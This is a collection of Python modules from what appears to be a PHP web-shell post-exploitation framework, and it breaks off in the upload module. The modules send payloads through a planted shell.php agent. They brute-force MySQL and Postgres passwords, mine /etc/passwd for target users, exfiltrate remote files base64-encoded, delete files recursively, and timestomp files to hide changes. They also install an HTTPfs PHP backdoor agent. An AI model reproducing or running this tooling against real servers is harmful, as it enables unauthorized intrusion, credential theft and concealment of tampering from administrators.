        self.argparser.add_argument('username', help='SQL username to bruteforce')
        self.argparser.add_argument('-hostname', help='DBMS host or host:port', default='127.0.0.1')
        self.argparser.add_argument('-wordfile', help='Local wordlist path')
        self.argparser.add_argument('-startline', help='Start line of local wordlist', type=int, default=0)
        self.argparser.add_argument('-chunksize', type=int, default=5000)
        self.argparser.add_argument('-wordlist', help='Try words written as "[\'word1\', \'word2\']"', type=type([]), default=[])
        self.argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')


        

    def _prepare(self):
        
        
        # Check chunk size
        if (self.args['hostname'] not in ('127.0.0.1', 'localhost')) and self.args['chunksize'] > 20:
            self.mprint('Chunk size %i: %s' % (self.args['chunksize'], WARN_CHUNKSIZE_TOO_BIG))
            
        # Load wordlist
        wordlist = self.args['wordlist']
        if not wordlist:
            if self.args['wordfile']:
                try:
                    local_file = open(self.args['wordfile'], 'r')
                except Exception, e:
                    raise ProbeException(self.name,  '\'%s\' %s' % (self.args['wordfile'], WARN_NO_SUCH_FILE))
                else:
                    wordlist = local_file.read().split('\n')
                    
        # If loaded, cut it from startline
        if not wordlist:
            raise ProbeException(self.name, WARN_NO_WORDLIST)   
        if self.args['startline'] < 0 or self.args['startline'] > len(wordlist)-1:
            raise ProbeException(self.name, WARN_STARTLINE)   
            
        
        wordlist = wordlist[self.args['startline']:]
            
        # Clean it
        wordlist = filter(None, uniq(wordlist))
            
        # Then divide in chunks
        chunksize = self.args['chunksize']
        wlsize = len(wordlist)
        if chunksize > 0 and wlsize > chunksize:
            self.args['wordlist'] = chunks(wordlist, chunksize)
        else:
            self.args['wordlist'] = [ wordlist ]

        
        dbms_connect = 'mysql_connect' if self.args['dbms'] == 'mysql' else 'pg_connect'
        
        if self.support_vectors.get('check_connect').execute({ 'dbms_connect' : dbms_connect }) != '1':
            raise ProbeException(self.name,  '\'%s\' %s' % (dbms_connect, WARN_NOT_CALLABLE))            
    
    def _probe(self):

        post_field = ''.join(choice(ascii_lowercase) for x in range(4))
        user_pwd_re = compile('\+ (.+):(.+)$')
        
        for chunk in self.args['wordlist']:
            
            joined_chunk='\\n'.join(chunk)
            formatted_args = { 'hostname' : self.args['hostname'], 'username' : self.args['username'], 'post_field' : post_field, 'data' : joined_chunk }
            self.mprint("%s: from '%s' to '%s'..." % (self.args['username'], chunk[0], chunk[-1]))
            result = self.support_vectors.get(self.args['dbms']).execute(formatted_args)  
            if result:
                user_pwd_matched = user_pwd_re.findall(result)
                if user_pwd_matched and len(user_pwd_matched[0]) == 2:
                    self._result = [ user_pwd_matched[0][0], user_pwd_matched[0][1]]
                    raise ProbeSucceed(self.name, 'Password found')
                    
                    
                
                
########NEW FILE########
__FILENAME__ = sqlusers
from core.module import Module
from core.moduleexception import ProbeException, ProbeSucceed
from core.argparse import ArgumentParser
from ast import literal_eval
from core.argparse import SUPPRESS
from os import sep
from string import ascii_lowercase
from random import choice
from re import compile
from sql import Sql

class Sqlusers(Sql):
    """Bruteforce all SQL users"""
    
    def _set_args(self):
    
        self.argparser.add_argument('-hostname', help='DBMS host or host:port', default='127.0.0.1')
        self.argparser.add_argument('-wordfile', help='Local wordlist path')
        self.argparser.add_argument('-startline', help='Start line of local wordlist', type=int, default=0)
        self.argparser.add_argument('-chunksize', type=int, default=5000)
        self.argparser.add_argument('-wordlist', help='Try words written as "[\'word1\', \'word2\']"', type=type([]), default=[])
        self.argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')

    def _set_vectors(self):
        Sql._set_vectors(self)
        self.support_vectors.add_vector('users', 'audit.etcpasswd',  [])


    def _prepare(self):
        
        users = self.support_vectors.get('users').execute()
        filtered_username_list = [u for u in users if 'sql' in u.lower() or 'sql' in users[u].descr.lower() or (users[u].uid == 0) or (users[u].uid > 999) or (('false' not in users[u].shell) and ('/home/' in users[u].home))  ]
        
        self.args['username_list'] = filtered_username_list
        Sql._prepare(self)
              
    def _probe(self):
        
        result = {}
        
        for user in self.args['username_list']:
            self.args['username'] = user
            try:
                Sql._probe(self)
            except ProbeSucceed:
                result[user] = self._result[1]
                self._result = []
        
        self._result = result
          
########NEW FILE########
__FILENAME__ = check
from core.module import Module
from core.moduleexception import ProbeException
from core.argparse import ArgumentParser
import datetime

WARN_INVALID_VALUE = 'Invalid returned value'

class Check(Module):
    '''Check remote files type, md5 and permission'''


    def _set_vectors(self):

        self.support_vectors.add_vector('exists', 'shell.php',  "$f='$rpath'; if(file_exists($f) || is_readable($f) || is_writable($f) || is_file($f) || is_dir($f)) print(1); else print(0);")
        self.support_vectors.add_vector("md5" ,'shell.php', "print(md5_file('$rpath'));")
        self.support_vectors.add_vector("read", 'shell.php',  "(is_readable('$rpath') && print(1)) || print(0);")
        self.support_vectors.add_vector("write", 'shell.php', "(is_writable('$rpath') && print(1))|| print(0);")
        self.support_vectors.add_vector("exec", 'shell.php', "(is_executable('$rpath') && print(1)) || print(0);")
        self.support_vectors.add_vector("isfile", 'shell.php', "(is_file('$rpath') && print(1)) || print(0);")
        self.support_vectors.add_vector("size", 'shell.php', "print(filesize('$rpath'));")
        self.support_vectors.add_vector("time_epoch", 'shell.php', "print(filemtime('$rpath'));")
        self.support_vectors.add_vector("time", 'shell.php', "print(filemtime('$rpath'));")
    
    
    def _set_args(self):
        self.argparser.add_argument('rpath', help='Remote path')
        self.argparser.add_argument('attr', help='Attribute to check',  choices = self.support_vectors.keys())

    def _probe(self):
        
        value = self.support_vectors.get(self.args['attr']).execute(self.args)
        
        if self.args['attr'] == 'md5' and value:
            self._result = value
        elif self.args['attr'] in ('size', 'time_epoch', 'time'):
            try:
                self._result = int(value)
            except ValueError, e:
                raise ProbeException(self.name, "%s: '%s'" % (WARN_INVALID_VALUE, value))
            
            if self.args['attr'] == 'time':
                self._result = datetime.datetime.fromtimestamp(self._result).strftime('%Y-%m-%d %H:%M:%S')
            
        elif value == '1':
            self._result = True
        elif value == '0':
            self._result = False
        else:
             raise ProbeException(self.name, "%s: '%s'" % (WARN_INVALID_VALUE, value))
            
########NEW FILE########
__FILENAME__ = download
'''
Created on 24/ago/2011

@author: norby
'''
from core.moduleguess import ModuleGuess
from core.moduleexception import  ModuleException, ExecutionException, ProbeException, ProbeSucceed
from core.http.request import Request
from base64 import b64decode
from hashlib import md5
from core.argparse import ArgumentParser
from core.utils import randstr
import os

WARN_NO_SUCH_FILE = 'No such file or permission denied'

class Download(ModuleGuess):
    '''Download binary/ascii files from the remote filesystem'''

    def _set_vectors(self):

        self.vectors.add_vector('file', 'shell.php', "print(@base64_encode(implode('', file('$rpath'))));")
        self.vectors.add_vector('fread', 'shell.php', "$f='$rpath'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));")
        self.vectors.add_vector("file_get_contents",'shell.php', "print(@base64_encode(file_get_contents('$rpath')));")
        self.vectors.add_vector("base64",'shell.sh',  "base64 -w 0 $rpath")
        self.vectors.add_vector("copy",'shell.php', "(copy('compress.zlib://$rpath','$downloadpath') && print(1)) || print(0);")
        self.vectors.add_vector("symlink", 'shell.php', "(symlink('$rpath','$downloadpath') && print(1)) || print(0);")
    
        self.support_vectors.add_vector("check_readable", 'file.check', "$rpath read".split(' '))
        self.support_vectors.add_vector("check_size", 'file.check', "$rpath size".split(' '))
        self.support_vectors.add_vector('upload2web', 'file.upload2web', '$rand -content 1'.split(' '))
        self.support_vectors.add_vector('remove', 'file.rm', '$rpath')
        self.support_vectors.add_vector('md5', 'file.check', '$rpath md5'.split(' '))
    
    def _set_args(self):
        self.argparser.add_argument('rpath')
        self.argparser.add_argument('lpath')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        
    def _prepare(self):
        self.transfer_dir = None
        self._output = 'False'

    def _prepare_vector(self):
        
        remote_path = self.args['rpath']
        self.formatted_args['rpath'] = self.args['rpath']
        
        # Check remote file existance
        if not self.support_vectors.get('check_readable').execute({'rpath' : remote_path}):
            raise ProbeException(self.name, '\'%s\' %s' % (remote_path, WARN_NO_SUCH_FILE))
        
        # Check remote file size
        remote_size = self.support_vectors.get('check_size').execute({'rpath' : remote_path})
        if remote_size == 0:

            local_path = self.args['lpath']
    
            try:
                f = open(local_path,'wb').close()
            except Exception, e:
                raise ProbeException(self.name, 'Writing %s' % (e))
            
            # Return md5 of emtpy file
            self._content = ''
            self._result = 'd41d8cd98f00b204e9800998ecf8427e'
            
            raise ProbeSucceed(self.name, 'File downloaded to \'%s\' with size 0.' % (local_path))
            

        # Vectory copy and symlink needs to search a writable directory before        
        if self.current_vector.name in ( 'copy', 'symlink' ):

                filename_temp = randstr() + remote_path.split('/').pop();
                upload_test = self.support_vectors.get('upload2web').execute({ 'rand' : filename_temp})

                if not upload_test:
                    raise ExecutionException(self.current_vector.name,'No transfer url dir found')

                self.formatted_args['downloadpath'] = upload_test[0]
                self.args['url'] = upload_test[1]

                self.support_vectors.get('remove').execute({ 'path' : self.formatted_args['downloadpath'] })

            

    def _execute_vector(self):
        
        output = self.current_vector.execute( self.formatted_args)
        
        if self.current_vector.name in ('copy', 'symlink'):

            if self.support_vectors.get('check_readable').execute({'rpath' : self.formatted_args['downloadpath']}):
                self._content = Request(self.args['url']).read()
                # Force deleting. Does not check existance, because broken links returns False
            
            self.support_vectors.get('remove').execute({'rpath' : self.formatted_args['downloadpath']})
            
        else:
            # All others encode data in b64 format
            
            try:
                self._content = b64decode(output)
            except TypeError:
                raise ExecutionException(self.current_vector.name,"Error, unexpected file content")


    def _verify_vector_execution(self):

        remote_path = self.args['rpath']
        local_path = self.args['lpath']

        try:
            f = open(local_path,'wb')
            f.write(self._content)
            f.close()
        except Exception, e:
            raise ProbeException(self.name, 'Writing %s' % (e))

        response_md5 = md5(self._content).hexdigest()
        remote_md5 = self.support_vectors.get('md5').execute({'rpath' : self.formatted_args['rpath']})

        # Consider as probe failed only MD5 mismatch
        if not remote_md5 == response_md5:
            
            if self.current_vector.name in ('copy', 'symlink') and not self.formatted_args['downloadpath'].endswith('.html') and not self.formatted_args['downloadpath'].endswith('.htm'):
                self.mprint("Transferred with '%s', rename as downloadable type as '.html' and retry" % (self.args['url']))

            self.mprint('MD5 hash mismatch: \'%s\' %s, \'%s\' %s' % ( local_path, response_md5, remote_path, remote_md5))
            raise ExecutionException(self.current_vector.name, 'file corrupt')
        
        elif not remote_md5:
            self.mprint('Remote MD5 check failed')
            
        self._result = response_md5
        
        raise ProbeSucceed(self.name, 'File downloaded to \'%s\'.' % (local_path))
    
    def _stringify_result(self):
        
        if self._result:
            self._output = 'True'
        else:
            self._output = 'False'

########NEW FILE########
__FILENAME__ = edit
from core.module import Module
from core.moduleexception import ProbeException, ProbeSucceed
from core.argparse import ArgumentParser

from tempfile import mkdtemp
from os import path
from subprocess import call
from shutil import copy
from core.utils import md5sum

WARN_DOWNLOAD_FAILED = 'Edit failed, check path and reading permission of'
WARN_BACKUP_FAILED = 'Backup version copy failed'
WARN_UPLOAD_FAILED = 'Edit failed, check path and writing permission of'
WARN_EDIT_FAILED = 'Edit failed, temporary file not found'
WARN_KEEP_FAILED = 'Fail keeping original timestamp'

class Edit(Module):
    '''Edit remote file'''


    def _set_vectors(self):
        self.support_vectors.add_vector('download', 'file.download', [ "$rpath", "$lpath" ])
        self.support_vectors.add_vector('upload', 'file.upload', [ "$lpath", "$rpath", "-force" ])
        self.support_vectors.add_vector('md5', 'file.check', [ "$rpath", "md5" ])
        self.support_vectors.add_vector('exists', 'file.check', [ "$rpath", "exists" ])
        self.support_vectors.add_vector('get_time', 'file.check', [ "$rpath", "time_epoch" ])
        self.support_vectors.add_vector('set_time', 'file.touch', [ "$rpath", "-epoch", "$epoch" ])


    def _set_args(self):
        self.argparser.add_argument('rpath', help='Remote path')
        self.argparser.add_argument('-editor', help='Choose editor. default: vim',  default = 'vim')
        self.argparser.add_argument('-keep-ts', help='Keep original timestamp',  action='store_true')
        

    def _probe(self):
        
        self._result = False
        
        rpathfolder, rfilename = path.split(self.args['rpath'])
        
        lpath = path.join(mkdtemp(),rfilename)
        lpath_orig = lpath + '.orig'
        
        rpath_existant = self.support_vectors.get('exists').execute({ 'rpath' : self.args['rpath'] })
        
        if rpath_existant:
            if not self.support_vectors.get('download').execute({ 'rpath' : self.args['rpath'], 'lpath' : lpath }):
                raise ProbeException(self.name, '%s \'%s\'' % (WARN_DOWNLOAD_FAILED, self.args['rpath']))
            
            if self.args['keep_ts']:
                self.args['epoch'] = self.support_vectors.get('get_time').execute({'rpath' : self.args['rpath']})
                
            try:
                copy(lpath, lpath_orig)
            except Exception, e:
                raise ProbeException(self.name, '\'%s\' %s %s' % (lpath_orig, WARN_BACKUP_FAILED, str(e)))
            
            call("%s %s" % (self.args['editor'], lpath), shell=True)
            
            md5_lpath_orig = md5sum(lpath_orig)
            if md5sum(lpath) == md5_lpath_orig:
                self._result = True
                raise ProbeSucceed(self.name, "File unmodified, no upload needed")
            
        else:
            call("%s %s" % (self.args['editor'], lpath), shell=True)
            
        if not path.exists(lpath):
            raise ProbeException(self.name, '%s \'%s\'' % (WARN_EDIT_FAILED, lpath))

            
        if not self.support_vectors.get('upload').execute({ 'rpath' : self.args['rpath'], 'lpath' : lpath }):
            
            recover_msg = ''
            
            if rpath_existant:
                if self.support_vectors.get('md5').execute({ 'rpath' : self.args['rpath'] }) != md5_lpath_orig:
                    recover_msg += 'Upload fail but remote file result modified. Recover backup copy from \'%s\'' % lpath_orig
        
            raise ProbeException(self.name, '%s \'%s\' %s' % (WARN_UPLOAD_FAILED, self.args['rpath'], recover_msg))
        
        if self.args['keep_ts'] and self.args.get('epoch', None):
            new_ts_output, new_ts = self.support_vectors.get('set_time').execute(self.args, return_out_res = True)

            if new_ts_output:
                self.mprint(new_ts_output)
            else:
                raise ProbeException(self.name, WARN_KEEP_FAILED)
                
        self._result = True
        
    def _stringify_result(self):
        pass
########NEW FILE########
__FILENAME__ = enum
from core.module import Module
from core.moduleexception import ProbeException
from core.argparse import ArgumentParser
from ast import literal_eval
from core.prettytable import PrettyTable
import os


class Enum(Module):
    '''Enumerate remote paths'''

    def _set_vectors(self):
        self.support_vectors.add_vector('getperms','shell.php',  "$f='$rpath'; if(file_exists($f)) { print('e'); if(is_readable($f)) print('r'); if(is_writable($f)) print('w'); if(is_executable($f)) print('x'); }")
    
    def _set_args(self):
        self.argparser.add_argument('pathfile', help='Enumerate paths written in PATHFILE')
        self.argparser.add_argument('-printall', help='Print also paths not found', action='store_true')
        self.argparser.add_argument('-pathlist', help='Enumerate paths written as "[\'/path/1\', \'/path/2\']"', type=type([]), default=[])




    def _prepare(self):
        
        self._result = {}
        
        if not self.args['pathlist']:
            try:
                self.args['pathlist']=open(os.path.expanduser(self.args['pathfile']),'r').read().splitlines()
            except:
                raise ProbeException(self.name,  "Error opening path list \'%s\'" % self.args['pathfile'])
                

    def _probe(self):
        
        for entry in self.args['pathlist']:
            self._result[entry] = ['', '', '', '']
            perms = self.support_vectors.get('getperms').execute({'rpath' : entry})
            
            if perms:
                if 'e' in perms: self._result[entry][0] = 'exists'
                if 'r' in perms: self._result[entry][1] = 'readable'
                if 'w' in perms: self._result[entry][2] = 'writable'
                if 'x' in perms: self._result[entry][3] = 'executable'

    def _stringify_result(self):
    
        table = PrettyTable(['']*5)
        table.align = 'l'
        table.header = False
        
        for field in self._result:
            if self._result[field] != ['', '', '', ''] or self.args['printall']:
                table.add_row([field] + self._result[field])
                
        self._output = table.get_string()
        
########NEW FILE########
__FILENAME__ = ls
from core.moduleguess import ModuleGuess
from core.moduleexception import ProbeException, ProbeSucceed, ModuleException
import time
import datetime

WARN_NO_SUCH_FILE = 'No such file or permission denied'

class Ls(ModuleGuess):
    '''List directory contents'''

    def _set_vectors(self):
        
        self.vectors.add_vector(name='ls_php', interpreter='shell.php', payloads = [ "$p=\"$rpath\"; if(@is_dir($p)) { $d=@opendir($p); $a=array(); if($d) { while(($f = @readdir($d))) { $a[]=$f; }; sort($a); print(join('\n', $a)); } } else { print($p); }" ])
        self.vectors.add_vector(name='ls', interpreter='shell.sh', payloads = [ 'ls "$rpath" $args' ])
        
        self.support_vectors.add_vector('exists_and_writ', 'shell.php',  "$f='$rpath'; if(file_exists($f) && ((is_dir($f) && is_readable($f)) || !is_dir($f))) print(1); else print(0);")

        
    def _set_args(self):
        self.argparser.add_argument('rpath', nargs='?', default='.')
        self.argparser.add_argument('args', nargs='*', help='Optional system shell \'ls\' arguments, preceeded by --')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        
    def _prepare(self):

        if self.support_vectors.get('exists_and_writ').execute({ 'rpath' : self.args['rpath'] }) == '0':
            raise ProbeException(self.name, WARN_NO_SUCH_FILE)
    
    def _prepare_vector(self):

        self.formatted_args['rpath'] = self.args['rpath']
        if self.current_vector.name == 'ls':
            self.formatted_args['args'] = ' '.join(self.args['args']) 

    def _verify_vector_execution(self):
        if self._result:
            raise ProbeSucceed(self.name, 'List OK')
            
    def _stringify_result(self):
        if self._result:
            # Fill self._result with file list only with ls_php vector or clean ls execution
            if self.current_vector.name == 'ls_php' or (self.current_vector.name == 'ls' and not self.formatted_args['args']):
                self._result = self._result.split('\n')
                self._output = '\n'.join([ f for f in self._result if f not in ('.', '..')])
            else:
                self._output = self._result           
########NEW FILE########
__FILENAME__ = mount
from modules.file.upload2web import Upload2web
from modules.file.upload import WARN_NO_SUCH_FILE
from core.moduleexception import ModuleException, ProbeException, ProbeSucceed
from core.argparse import ArgumentParser
from core.argparse import SUPPRESS
import re, os
from core.utils import randstr
from commands import getstatusoutput
from tempfile import mkdtemp
from urlparse import urlparse
from platform import machine

WARN_ERR_RUN_HTTPFS = 'HTTPfs binary not found. Install it from \'https://github.com/cyrus-and/httpfs\'.'
WARN_ERR_GEN_PHP = 'HTTPfs PHP generation failed'
WARN_HTTPFS_MOUNTPOINT = 'Remote mountpoint not found'
WARN_HTTPFS_OUTP = 'HTTPfs output debug'
WARN_HTTPFS_RUN = 'HTTPfs run failed'
WARN_FUSE_UMOUNT = 'Fusermount umount failed'
WARN_MOUNT = 'Mount call failed'
WARN_MOUNT_NOT_FOUND = 'No HTTPfs mount found'
WARN_HTTPFS_CHECK = 'Check HTTPfs configuration following \'https://github.com/cyrus-and/httpfs\' instructions'
WARN_MOUNT_OK = """Mounted '%s' into local folder '%s'. 
Run ":file.mount -just-mount '%s'" to remount without reinstalling remote agent.
Umount with ':file.mount -umount-all'. When not needed anymore, remove%sremote agent."""

class Mount(Upload2web):
    '''Mount remote filesystem using HTTPfs '''

    def _set_args(self):
        
        self.argparser.add_argument('-remote-mount', help='Mount remote folder, default: \'.\'', default = '.')
        self.argparser.add_argument('-local-mount', help='Mount to local mountpoint, default: temporary folder')
        
        self.argparser.add_argument('-rpath', help='Upload PHP agent as rpath', nargs='?')
        self.argparser.add_argument('-startpath', help='Upload PHP agent in first writable subdirectory', metavar='STARTPATH', default='.')

        self.argparser.add_argument('-just-mount', metavar='URL', help='Mount URL without install PHP agent')
        self.argparser.add_argument('-just-install', action='store_true', help="Install remote PHP agent without mount")
        self.argparser.add_argument('-umount-all', action='store_true', help='Umount all mounted HTTPfs filesystems')
        
        self.argparser.add_argument('-httpfs-path', help='Specify HTTPfs binary path if not in system paths', default='httpfs')
        
        self.argparser.add_argument('-force', action='store_true', help=SUPPRESS)
        self.argparser.add_argument('-chunksize', type=int, default=1024, help=SUPPRESS)
        self.argparser.add_argument('-vector', choices = self.vectors.keys(), help=SUPPRESS)
        
    def _set_vectors(self):
        Upload2web._set_vectors(self)
        
        self.support_vectors.add_vector("exists", 'file.check', "$rpath exists".split(' '))
        
    def _prepare(self):

        self.__check_httpfs()
    
        # If not umount or just-mount URL, try installation
        if not self.args['umount_all'] and not self.args['just_mount']:
            
            self.__generate_httpfs()
                        
            Upload2web._prepare(self)

        # If just mount, set remote url
        elif self.args['just_mount']:
            self.args['url'] = self.args['just_mount']



    def _probe(self):
        
        
        if not self.support_vectors.get('exists').execute({ 'rpath' : self.args['remote_mount'] }):
            raise ProbeException(self.name, '%s \'%s\'' % (WARN_HTTPFS_MOUNTPOINT, self.args['remote_mount']))             
        
        self.args['remote_mount'] = self.support_vectors.get('normalize').execute({ 'path' : self.args['remote_mount'] })
    
        
        if self.args['umount_all']:
            # Umount all httpfs partitions
            self.__umount_all()
            raise ProbeSucceed(self.name, 'Unmounted partitions')
        
        if not self.args['just_mount']:
            # Upload remote
            try:    
                Upload2web._probe(self)
            except ProbeSucceed:
                pass
                
        if not self.args['just_install']:
            
            if not self.args['local_mount']:
                self.args['local_mount'] = mkdtemp()
                
            cmd = '%s mount %s %s %s' % (self.args['httpfs_path'], self.args['url'], self.args['local_mount'], self.args['remote_mount'])
    
            status, output = getstatusoutput(cmd)
            if status == 0:
                if output:
                    raise ProbeException(self.name,'%s\nCOMMAND:\n$ %s\nOUTPUT:\n> %s\n%s' % (WARN_HTTPFS_OUTP, cmd, output.replace('\n', '\n> '), WARN_HTTPFS_CHECK))
                    
            else:
                raise ProbeException(self.name,'%s\nCOMMAND:\n$ %s\nOUTPUT:\n> %s\n%s' % (WARN_HTTPFS_RUN, cmd, output.replace('\n', '\n> '), WARN_HTTPFS_CHECK))
                    

    def _verify(self):
        # Verify Install
        if not self.args['umount_all'] and not self.args['just_mount']:
            Upload2web._verify(self)
              
    def _stringify_result(self):


        self._result = [
                        self.args['url'] if 'url' in self.args else None, 
                        self.args['local_mount'], 
                        self.args['remote_mount']
                        ]

        # Verify Install
        if not self.args['umount_all'] and not self.args['just_mount'] and not self.args['just_install']:
            
            urlparsed = urlparse(self.modhandler.url)
            if urlparsed.hostname:
                remoteuri = '%s:%s' % (urlparsed.hostname, self.args['remote_mount'])
    
            rpath = ' '
            if self.args['rpath']:
                rpath = ' \'%s\' ' % self.args['rpath']
    
            self._output = WARN_MOUNT_OK % ( remoteuri, self.args['local_mount'], self.args['url'], rpath )
                
                
    def __umount_all(self):
        
        status, output = getstatusoutput('mount')
        if status != 0 or not output:
            raise ProbeException(self.name, '%s: %s' % (WARN_FUSE_UMOUNT, output))     

        local_mountpoints = re.findall('(/[\S]+).+httpfs',output)
        if not local_mountpoints:
            raise ProbeException(self.name, WARN_MOUNT_NOT_FOUND)  
            
        for mountpoint in local_mountpoints:
        
            cmd = 'fusermount -u %s' % (mountpoint)
            status, output = getstatusoutput(cmd)
            if status != 0:
                raise ProbeException(self.name, '%s: %s' % (WARN_FUSE_UMOUNT, output))     
        
        self.mprint('Umounted: \'%s\'' % '\', '.join(local_mountpoints))


    def __check_httpfs(self):
        
        status, output = getstatusoutput('%s --version' % self.args['httpfs_path'])
        if status != 0 or not output:
            raise ModuleException(self.name, '\'%s\' %s' % (self.args['httpfs_path'], WARN_ERR_RUN_HTTPFS))        

    def __generate_httpfs(self):
        
        status, php_bd_content = getstatusoutput('%s generate php' % (self.args['httpfs_path']))
        if status != 0 or not php_bd_content:
            raise ProbeException(self.name, '\'%s\' %s' % (self.args['httpfs_path'], WARN_ERR_GEN_PHP))

        self.args['lpath'] = randstr(4) + '.php'
        self.args['content'] = php_bd_content        
        

########NEW FILE########
__FILENAME__ = read
from modules.file.download import Download
from tempfile import NamedTemporaryFile
from core.argparse import ArgumentParser
from core.moduleguess import ModuleGuess

class Read(Download):
    '''Read remote file'''


    def _set_args(self):
        self.argparser.add_argument('rpath')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())

    def _verify_vector_execution(self):

        file = NamedTemporaryFile()
        file.close()

        self.args['lpath'] = file.name
        
        return Download._verify_vector_execution(self)
    
    def _stringify_result(self):
        self._result = self._content
        return ModuleGuess._stringify_result(self)

########NEW FILE########
__FILENAME__ = rm


from core.moduleguess import ModuleGuess
from core.moduleexception import ModuleException, ProbeSucceed, ProbeException, ExecutionException
from core.argparse import ArgumentParser

WARN_NO_SUCH_FILE = 'No such file or permission denied'
WARN_DELETE_FAIL = 'Cannot remove, check permission or recursion'
WARN_DELETE_OK = 'File deleted'

class Rm(ModuleGuess):
    '''Remove remote files and folders'''


    def _set_vectors(self):
        self.vectors.add_vector('php_rmdir', 'shell.php', """
    function rmfile($dir) {
    if (is_dir("$dir")) rmdir("$dir");
    else { unlink("$dir"); }
    }
    function exists($path) {
    return (file_exists("$path") || is_link("$path"));
    }
    function rrmdir($recurs,$dir) {
        if($recurs=="1") {
            if (is_dir("$dir")) {
                $objects = scandir("$dir");
                foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                if (filetype($dir."/".$object) == "dir") rrmdir($recurs, $dir."/".$object); else unlink($dir."/".$object);
                }
                }
                reset($objects);
                rmdir("$dir");
            }
            else rmfile("$dir");
        }
        else rmfile("$dir");
    }
    $recurs="$recursive"; $path="$rpath";
    if(exists("$path")) 
    rrmdir("$recurs", "$path");""")
        self.vectors.add_vector('rm', 'shell.sh', "rm $recursive $rpath")

    
    def _set_args(self):
        self.argparser.add_argument('rpath', help='Remote starting path')
        self.argparser.add_argument('-recursive', help='Remove recursively', action='store_true')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())


    def _prepare(self):
        
        self._result = False
        self.modhandler.load('file.check').run([ self.args['rpath'], 'exists' ])
        if not self.modhandler.load('file.check')._result:
            raise ProbeException(self.name, WARN_NO_SUCH_FILE)        


    def _prepare_vector(self):
        
        self.formatted_args = { 'rpath' : self.args['rpath'] }
        
        if self.current_vector.name == 'rm':
            self.formatted_args['recursive'] = '-rf' if self.args['recursive'] else ''
        else:
            self.formatted_args['recursive'] = '1' if self.args['recursive'] else ''
            
            
    def _verify_vector_execution(self):
        self.modhandler.load('file.check').run([ self.args['rpath'], 'exists' ])
        result = self.modhandler.load('file.check')._result
        
        if result == False:
            self._result = True
            raise ProbeSucceed(self.name, WARN_DELETE_OK)
        
    def _verify(self):
        raise ProbeException(self.name, WARN_DELETE_FAIL)
    
    def _stringify_result(self):
        self._output = ''
########NEW FILE########
__FILENAME__ = touch
from core.moduleguess import ModuleGuess
from core.moduleexception import ProbeException, ProbeSucceed, ModuleException
import time
import datetime
import os


class Touch(ModuleGuess):
    '''Change file timestamps'''

    def _set_vectors(self):
        
        self.vectors.add_vector(name='touch_php', interpreter='shell.php', payloads = [ "touch('$rpath', '$epoch_time');" ])
        self.vectors.add_vector(name='touch', interpreter='shell.sh', payloads = [ 'touch -d @$epoch_time "$rpath" ' ])

        self.support_vectors.add_vector(name="exists", interpreter='file.check', payloads = ['$rpath', 'exists'])
        self.support_vectors.add_vector(name='get_epoch', interpreter='file.check', payloads = ['$rpath', 'time_epoch'])
        self.support_vectors.add_vector(name='ls', interpreter='file.ls', payloads = ['$rpath'])
        
        
    def _set_args(self):
        self.argparser.add_argument('rpath')
        self.argparser.add_argument('-time', help='Use timestamp like \'2004-02-29 16:21:42\' or \'16:21\'')
        self.argparser.add_argument('-epoch', help='Use epoch timestamp')
        self.argparser.add_argument('-ref', help='Use other file\'s time')
        self.argparser.add_argument('-oldest', action='store_true', help='Use time of the oldest file in same folder')        
    
        
    def _prepare(self):
        global dateutil
        try:
            import dateutil.parser
        except ImportError, e:
            raise ModuleException(self.name, str(e) + ', install \'dateutil\' python module')
        
    def __get_epoch_ts(self, rpath):

        ref_epoch = 0
        if self.support_vectors.get('exists').execute({ 'rpath' : rpath }):
            ref_epoch = self.support_vectors.get('get_epoch').execute({ 'rpath' : rpath })
        
        if not ref_epoch:
            raise ProbeException(self.name, 'can\'t get timestamp from \'%s\'' % ref_epoch)
        
        return ref_epoch
    
    def __get_oldest_ts(self, rpath, limit=5):
      
      rfolder, rfile = os.path.split(rpath)
      if not rfolder:
          rfolder = '.'
      
      file_ls_all = self.support_vectors.get('ls').execute({ 'rpath' : rfolder})
      
      if len(file_ls_all) >= limit:
          file_ls = file_ls_all[:limit]
      else:
          file_ls = file_ls_all
      
      file_ts = []
      for file in [ rfolder.rstrip('/') + '/' + filepath for filepath in file_ls ]:
          ts = self.__get_epoch_ts(file)
          if ts: 
              file_ts.append(ts)
          
      if file_ts:
          return min(file_ts)
      else:
          return 0
    
    def _prepare_vector(self):
        
        self.formatted_args['rpath'] = self.args['rpath']
        if self.args['oldest'] == True:
            # get oldest timestamp
            self.formatted_args['epoch_time'] = self.__get_oldest_ts(self.args['rpath'])
            
        elif self.args['epoch']:
            self.formatted_args['epoch_time'] = float(self.args['epoch'])
            
        elif self.args['ref']:
            self.formatted_args['epoch_time'] = self.__get_epoch_ts(self.args['ref'])
            
        elif self.args['time']:
            self.formatted_args['epoch_time'] = int(time.mktime(dateutil.parser.parse(self.args['time'], yearfirst=True).timetuple()))

        else:
            raise ModuleException(self.name, 'Too few arguments, specify -time or -ref or -oldest')
            
    def _verify_vector_execution(self):
        current_epoch = self.__get_epoch_ts(self.args['rpath'])
        if current_epoch == self.formatted_args['epoch_time']:
            self._result = current_epoch
            raise ProbeSucceed(self.name, "Correct timestamp")
            
    def _verify(self):
        if not self._result:
            raise ProbeException(self.name, "Unable to change timestamp, check permission")
            
    def _stringify_result(self):
        if self._result:
            self._output = 'Changed timestamp: %s' % datetime.datetime.fromtimestamp(self._result).strftime('%Y-%m-%d %H:%M:%S')
       

########NEW FILE########
__FILENAME__ = upload
'''
Created on 23/set/2011

@author: norby
'''

from core.moduleguess import ModuleGuess
from core.moduleexception import  ModuleException, ExecutionException, ProbeException, ProbeSucceed
from core.http.cmdrequest import CmdRequest, NoDataException
from random import choice
from hashlib import md5
from core.argparse import ArgumentParser
from core.argparse import SUPPRESS
from core.utils import b64_chunks
from base64 import b64encode

WARN_FILE_EXISTS = 'File exists'
WARN_NO_SUCH_FILE = 'No such file or permission denied'
WARN_MD5_MISMATCH = 'MD5 hash mismatch'
WARN_UPLOAD_FAIL = 'Upload fail, check path and permission'


class Upload(ModuleGuess):
    '''Upload binary/ascii file into remote filesystem'''

    def _set_vectors(self):
